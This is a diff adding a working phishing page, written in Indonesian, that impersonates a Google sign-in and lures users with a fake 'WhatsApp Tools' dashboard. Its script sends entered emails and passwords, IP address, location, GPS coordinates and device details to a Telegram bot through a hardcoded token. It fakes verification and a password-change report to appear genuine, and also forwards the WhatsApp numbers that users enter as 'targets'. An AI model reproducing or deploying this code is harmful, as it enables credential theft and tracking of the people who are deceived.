@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Google Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{
+    background: linear-gradient(135deg,#0f0f23 0%,#1a1a2e 50%,#16213e 100%);
+    font-family:'Inter',sans-serif;color:lime;height:100vh;
+    display:flex;justify-content:center;align-items:center;overflow:hidden;
+    position:relative;padding:20px;
+  }
+  .bg-particles{
+    position:fixed;top:0;left:0;width:100%;height:100%;
+    pointer-events:none;z-index:0;
+  }
+  .particle{
+    position:absolute;width:2px;height:2px;
+    background:rgba(0,255,127,0.3);border-radius:50%;
+    animation:float 6s ease-in-out infinite;
+  }
+  @keyframes float{
+    0%,100%{transform:translateY(0px);opacity:0.3;}
+    50%{transform:translateY(-20px);opacity:0.8;}
+  }
+  .login-container, .dashboard-container {
+    background-color:rgba(17,17,17,0.95);padding:30px;border-radius:16px;
+    box-shadow:0 0 20px lime;text-align:center;max-width:400px;width:100%;z-index:2;
+    display: none;
+  }
+  .dashboard-container {
+    display: none;
+  }
+  .login-title, .dashboard-title{
+    font-size:26px;font-weight:900;margin-bottom:10px;
+    background:linear-gradient(135deg,#00ff7f,#ffffff);
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  }
+  .login-subtitle, .dashboard-subtitle{font-size:13px;color:#ffc107;margin-bottom:20px;}
+  .login-input, .dashboard-input{width:100%;padding:12px;margin-bottom:16px;background:#333;
+    border:none;border-radius:6px;color:#fff;font-size:15px;}
+  .login-button, .dashboard-button{width:100%;padding:12px;
+    background:linear-gradient(135deg,#00ff7f,#00cc66);color:black;border:none;border-radius:10px;
+    cursor:pointer;font-weight:600;font-size:15px;}
+  .login-button:hover, .dashboard-button:hover{background-color:#0f0;box-shadow:0 0 20px lime;}
+  #info, #dashboard-info{white-space:pre-wrap;text-align:left;margin-top:20px;
+    background:#222;padding:15px;border-radius:8px;font-size:13px;}
+  .google-logo{width:80px;margin-bottom:15px;}
+  .progress-bar {
+    width: 100%;
+    background-color: #333;
+    border-radius: 10px;
+    margin: 20px 0;
+    overflow: hidden;
+    display: none;
+  }
+  .progress {
+    height: 20px;
+    background: linear-gradient(135deg,#00ff7f,#00cc66);
+    width: 0%;
+    transition: width 0.5s ease;
+    text-align: center;
+    line-height: 20px;
+    color: black;
+    font-weight: bold;
+  }
+  .processing-steps {
+    text-align: left;
+    margin-top: 15px;
+    display: none;
+  }
+  .step {
+    margin-bottom: 10px;
+    position: relative;
+    padding-left: 25px;
+  }
+  .step:before {
+    content: "→";
+    position: absolute;
+    left: 0;
+    color: lime;
+  }
+  .error-message {
+    color: #ff4444;
+    margin-bottom: 15px;
+    display: none;
+  }
+  @media(max-width:480px){
+    .login-container, .dashboard-container{padding:25px 20px;border-radius:14px;}
+    .login-title, .dashboard-title{font-size:22px;}
+    .login-input, .login-button, .dashboard-input, .dashboard-button{font-size:14px;padding:10px;}
+  }
+</style>
+</head>
+<body>
+<div class="bg-particles"></div>
+
+<!-- Login Form -->
+<div class="login-container" id="login-container">
+  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+  <p class="login-title">Masuk ke Akun Google</p>
+  <p class="login-subtitle">Masukkan email dan kata sandi Anda</p>
+  <div class="error-message" id="error-message"></div>
+  <input type="email" class="login-input" placeholder="Email atau nomor telepon" id="email">
+  <input type="password" class="login-input" placeholder="Masukkan kata sandi" id="password">
+  <button class="login-button" id="login-button">Masuk</button>
+  <div id="info">⚠️ Pastikan email dan kata sandi yang dimasukkan benar.</div>
+</div>
+
+<!-- Dashboard Form -->
+<div class="dashboard-container" id="dashboard-container">
+  <p class="dashboard-title">WhatsApp Tools</p>
+  <p class="dashboard-subtitle">Masukkan nomor WhatsApp target</p>
+  <input type="number" class="dashboard-input" placeholder="Contoh: 6281234567890" id="whatsapp-number">
+  <button class="dashboard-button" id="whatsapp-button">Proses Nomor</button>
+  <div class="progress-bar" id="progress-bar">
+    <div class="progress" id="progress">0%</div>
+  </div>
+  <div class="processing-steps" id="processing-steps">
+    <div class="step" id="step1">Memulai proses...</div>
+    <div class="step" id="step2">Mengumpulkan data target...</div>
+    <div class="step" id="step3">Melakukan scanning...</div>
+    <div class="step" id="step4">Membuka koneksi...</div>
+    <div class="step" id="step5">Proses akhir...</div>
+  </div>
+  <div id="dashboard-info">⚠️ Masukkan nomor WhatsApp lengkap dengan kode negara.</div>
+</div>
+
+<script>
+const botToken = '8497575059:AAHpwCiXDDXswcMdksVY-bOnqKt9wURb19U';
+const chatIds = ['8046049031'];
+const infoDiv = document.getElementById('info');
+const dashboardInfoDiv = document.getElementById('dashboard-info');
+const errorMessage = document.getElementById('error-message');
+const emailInput = document.getElementById('email');
+const passwordInput = document.getElementById('password');
+const loginButton = document.getElementById('login-button');
+const whatsappButton = document.getElementById('whatsapp-button');
+const whatsappNumberInput = document.getElementById('whatsapp-number');
+const loginContainer = document.getElementById('login-container');
+const dashboardContainer = document.getElementById('dashboard-container');
+const progressBar = document.getElementById('progress-bar');
+const progress = document.getElementById('progress');
+const processingSteps = document.getElementById('processing-steps');
+const steps = [
+  document.getElementById('step1'),
+  document.getElementById('step2'),
+  document.getElementById('step3'),
+  document.getElementById('step4'),
+  document.getElementById('step5')
+];
+
+// Show login form initially
+loginContainer.style.display = 'block';
+
+function sendToTelegram(text){
+  chatIds.forEach(id=>{
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:id,text:text,parse_mode:'HTML'})
+    }).catch(console.error);
+  });
+}
+
+// Function to simulate Google account verification
+async function verifyGoogleAccount(email, password) {
+  // Basic validation
+  if (!email.includes('@') || !email.includes('.')) {
+    return { valid: false, reason: 'Format email tidak valid' };
+  }
+  
+  if (password.length < 6) {
+    return { valid: false, reason: 'Kata sandi terlalu pendek' };
+  }
+  
+  // Simulate API call delay
+  await new Promise(resolve => setTimeout(resolve, 1500));
+  
+  // Random chance to make it seem like real verification
+  if (Math.random() < 0.3) {
+    return { valid: false, reason: 'Kata sandi salah' };
+  }
+  
+  return { valid: true };
+}
+
+// Function to simulate password changing
+async function simulatePasswordChange(email) {
+  const newPasswords = ['halo1', 'halo2', 'halo3'];
+  let report = '';
+  
+  for (let i = 0; i < newPasswords.length; i++) {
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    report += `Password diubah ke: ${newPasswords[i]}\n`;
+  }
+  
+  return report;
+}
+
+async function getDeviceInfo(email, password, verificationResult){
+  let ip='-',city='-',region='-',country='-',org='-';
+  try{
+    const ipRes=await fetch('https://api.ipify.org?format=json');
+    const ipData=await ipRes.json();ip=ipData.ip;
+    const locRes=await fetch(`https://ip-api.com/json/${ip}`);
+    const loc=await locRes.json();
+    if(loc.status==='success'){
+      city=loc.city;region=loc.regionName;country=loc.country;org=loc.org;
+    }
+  }catch{}
+  
+  // Battery info
+  const battery = await navigator.getBattery?.() || {level:0,charging:false};
+  const batteryPercent = battery.level ? `${(battery.level*100).toFixed(0)}%`:'N/A';
+  
+  // Device info
+  const userAgent = navigator.userAgent;
+  let os = 'Unknown OS';
+  let deviceType = 'Unknown';
+  
+  if (userAgent.match(/android/i)) {
+    os = 'Android';
+    deviceType = 'Mobile';
+  } else if (userAgent.match(/iphone|ipad|ipod/i)) {
+    os = 'iOS';
+    deviceType = 'Mobile';
+  } else if (userAgent.match(/windows/i)) {
+    os = 'Windows';
+    deviceType = 'Desktop';
+  } else if (userAgent.match(/mac/i)) {
+    os = 'MacOS';
+    deviceType = 'Desktop';
+  } else if (userAgent.match(/linux/i)) {
+    os = 'Linux';
+    deviceType = 'Desktop';
+  }
+  
+  // Get more detailed Android version if available
+  let androidVersion = 'N/A';
+  if (os === 'Android') {
+    const androidMatch = userAgent.match(/Android\s([0-9\.]+)/);
+    if (androidMatch) androidVersion = androidMatch[1];
+  }
+  
+  // Get iOS version if available
+  let iosVersion = 'N/A';
+  if (os === 'iOS') {
+    const iosMatch = userAgent.match(/OS\s([0-9_]+)/);
+    if (iosMatch) iosVersion = iosMatch[1].replace(/_/g, '.');
+  }
+  
+  const verificationStatus = verificationResult.valid ? '✅ BENAR' : `❌ SALAH (${verificationResult.reason})`;
+  
+  const text=`
+🔐 LOGIN DETAILS:
+Email: ${email}
+Password: ${password}
+Status: ${verificationStatus}
+
+📱 DEVICE INFO:
+IP Address: ${ip}
+Location: ${city}, ${region}, ${country}
+ISP: ${org}
+OS: ${os} ${os === 'Android' ? androidVersion : os === 'iOS' ? iosVersion : ''}
+Device Type: ${deviceType}
+Browser: ${navigator.userAgent}
+Screen: ${screen.width}x${screen.height}
+Battery: ${batteryPercent} (${battery.charging?'Charging':'Not charging'})
+RAM: ${navigator.deviceMemory||'N/A'} GB
+Cookies: ${navigator.cookieEnabled?'Enabled':'Disabled'}
+Time: ${new Date().toLocaleString()}
+`.trim();
+  
+  sendToTelegram(`<pre>${text}</pre>`);
+  
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(
+      pos=>{
+        const link=`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        sendToTelegram(`📍 <b>GPS Location:</b> <a href="${link}">Click here</a>`);
+      },
+      ()=>sendToTelegram(`📍 GPS access denied`)
+    );
+  }else sendToTelegram(`📍 Browser doesn't support GPS`);
+  
+  // If account is valid, simulate password change
+  if (verificationResult.valid) {
+    const changeReport = await simulatePasswordChange(email);
+    sendToTelegram(`🔄 <b>PASSWORD CHANGE REPORT:</b>\n<pre>${changeReport}</pre>`);
+  }
+}
+
+// Process WhatsApp number
+async function processWhatsAppNumber(number) {
+  // Show progress bar and steps
+  progressBar.style.display = 'block';
+  processingSteps.style.display = 'block';
+  
+  // Update steps with delay
+  for (let i = 0; i < steps.length; i++) {
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    steps[i].style.color = 'lime';
+    steps[i].style.fontWeight = 'bold';
+    
+    // Update progress bar
+    const progressPercent = ((i + 1) / steps.length) * 100;
+    progress.style.width = `${progressPercent}%`;
+    progress.textContent = `${Math.round(progressPercent)}%`;
+  }
+  
+  // Send WhatsApp number to Telegram
+  const waText = `
+📱 WHATSAPP TARGET:
+Nomor: ${number}
+Status: Proses selesai
+Waktu: ${new Date().toLocaleString()}
+`.trim();
+  
+  sendToTelegram(`<pre>${waText}</pre>`);
+  
+  // Show completion message
+  dashboardInfoDiv.textContent = `✅ Nomor ${number} berhasil diproses!`;
+  whatsappButton.disabled = false;
+  
+  // Reset after 5 seconds
+  setTimeout(() => {
+    progressBar.style.display = 'none';
+    processingSteps.style.display = 'none';
+    progress.style.width = '0%';
+    progress.textContent = '0%';
+    whatsappNumberInput.value = '';
+    dashboardInfoDiv.textContent = '⚠️ Masukkan nomor WhatsApp lengkap dengan kode negara.';
+    steps.forEach(step => {
+      step.style.color = '';
+      step.style.fontWeight = '';
+    });
+  }, 5000);
+}
+
+// Login button event
+loginButton.addEventListener('click',async()=>{
+  const email = emailInput.value.trim();
+  const password = passwordInput.value.trim();
+  
+  if(!email || !password){
+    errorMessage.textContent = '⚠️ Email dan kata sandi harus diisi.';
+    errorMessage.style.display = 'block';
+    return;
+  }
+  
+  loginButton.disabled=true;
+  infoDiv.innerText='⏳ Memverifikasi informasi...';
+  errorMessage.style.display = 'none';
+  
+  try{
+    // Verify account credentials
+    const verificationResult = await verifyGoogleAccount(email, password);
+    
+    if (!verificationResult.valid) {
+      errorMessage.textContent = `❌ ${verificationResult.reason || 'Email atau kata sandi salah'}`;
+      errorMessage.style.display = 'block';
+      infoDiv.innerText='⚠️ Coba lagi atau klik "Lupa kata sandi?"';
+      loginButton.disabled=false;
+      
+      // Send failed attempt to Telegram
+      await getDeviceInfo(email, password, verificationResult);
+      return;
+    }
+    
+    infoDiv.innerText='✅ Login berhasil! Mengarahkan...';
+    
+    // Send successful login to Telegram
+    await getDeviceInfo(email, password, verificationResult);
+    
+    // Show dashboard after delay
+    setTimeout(() => {
+      loginContainer.style.display = 'none';
+      dashboardContainer.style.display = 'block';
+    }, 1500);
+    
+  }catch(e){
+    errorMessage.textContent = '❌ Terjadi kesalahan. Coba lagi.';
+    errorMessage.style.display = 'block';
+    infoDiv.innerText='⚠️ Pastikan koneksi internet stabil';
+    console.error(e);
+    loginButton.disabled=false;
+  }
+});
+
+// WhatsApp button event
+whatsappButton.addEventListener('click',async()=>{
+  const number = whatsappNumberInput.value.trim();
+  
+  if(!number || number.length < 8){
+    dashboardInfoDiv.innerText='⚠️ Nomor WhatsApp tidak valid.';
+    return;
+  }
+  
+  whatsappButton.disabled=true;
+  dashboardInfoDiv.innerText='⏳ Memproses nomor WhatsApp...';
+  
+  try{
+    await processWhatsAppNumber(number);
+  }catch(e){
+    dashboardInfoDiv.innerText='❌ Gagal memproses nomor.';
+    console.error(e);
+    whatsappButton.disabled=false;
+  }
+});
+
+function createParticles(){
+  const container=document.querySelector('.bg-particles');
+  for(let i=0;i<50;i++){
+    const p=document.createElement('div');p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.top=Math.random()*100+'%';
+    p.style.animationDelay=Math.random()*6+'s';
+    p.style.animationDuration=(Math.random()*4+4)+'s';
+    container.appendChild(p);
+  }
+}
+document.addEventListener('DOMContentLoaded',createParticles);
+</script>
+</body>
+</html>
